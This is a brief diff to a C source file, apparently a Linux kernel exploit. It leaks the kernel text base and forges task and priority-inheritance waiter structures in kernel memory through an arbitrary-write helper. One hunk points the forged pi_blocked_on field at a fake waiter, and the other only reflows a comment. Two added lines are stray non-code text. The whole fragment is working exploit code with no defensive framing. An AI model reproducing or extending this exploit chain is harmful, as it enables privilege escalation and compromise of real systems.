@@ -1,3 +1,5 @@
+name=src/slide_app.c
+[entire file contents]
 #include "common.h"
 
 #ifndef SLIDE_MAX_ATTEMPTS
@@ -1143,8 +1145,8 @@ uint64_t slide_child_leak_stext(void) {
   if (stext) {
     return stext;
   }
-  /* No leak: park forever instead of exiting; task teardown would walk
-   * the dangling pi_blocked_on through our forged waiter. */
+  /* No leak: park forever instead of exiting; task teardown would walk the
+   * dangling pi_blocked_on through our forged waiter. */
   for (;;) {
     pause();
   }
@@ -1770,7 +1772,7 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
       !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF + 0x08,
                        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
       !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, task) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0)) {
+      !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, waiter)) {
     return 0;
   }
 
